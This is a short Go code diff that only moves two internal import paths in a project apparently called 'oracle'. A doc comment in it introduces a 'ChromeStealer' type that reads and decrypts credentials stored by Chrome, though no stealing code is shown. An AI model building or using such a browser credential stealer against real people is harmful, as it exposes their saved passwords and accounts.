@@ -12,8 +12,8 @@ import (
 
 	_ "github.com/mattn/go-sqlite3" // sqlite driver
 
-	"github.com/kahlys/codex/go/cmd/oracle/internal/cryptox"
-	"github.com/kahlys/codex/go/cmd/oracle/internal/osx"
+	"github.com/kahlys/codex/tools/go/oracle/internal/cryptox"
+	"github.com/kahlys/codex/tools/go/oracle/internal/osx"
 )
 
 // ChromeStealer reads and decrypts credentials stored by Chrome.
